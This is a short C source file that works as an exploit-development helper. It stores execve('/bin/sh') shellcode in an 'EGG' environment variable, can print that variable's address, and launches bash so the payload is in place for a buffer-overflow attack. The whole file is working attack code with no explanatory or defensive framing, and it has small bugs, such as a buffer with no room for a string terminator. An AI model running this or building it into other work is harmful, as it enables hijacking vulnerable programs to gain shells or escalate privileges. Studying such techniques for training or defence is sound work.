#include <stdlib.h>
#include <string.h>
#include <stdio.h>



char code[] = "H1\xd2H\xbb//bin/shH\xc1\xeb\x08SH\x89\xe7PWH\x89\xe6\xb0;\x0f\x05H1\xd2H\xbb//bin/shH\xc1\xeb\x08SH\x89\xe7PWH\x89\xe6\xb0;\x0f\x05";

int main() {

    /* Print addr of egg if exists */
    char* egg;
    if (egg = getenv("EGG")) {
        printf("Egg is at addr 0x%x\n", egg);
        return 0;
    }

    /* Declare buffer to hold nop sled and egg */
    size_t buf_size = strlen(code); // strlen(code) == no sled
    char buf[buf_size];

    /* Fill with nops */
    memset(buf, 0x90, buf_size);

    /* Place shellcode at the end of buf */
    memcpy(&buf[buf_size-strlen(code)], code, strlen(code));

    /* Assign and place the variable in the environment, and overwrite if exists */
    setenv("EGG", buf, 1);

    /* Spwan a shell with the above modified env */
    system("bash");

    return 0;
}
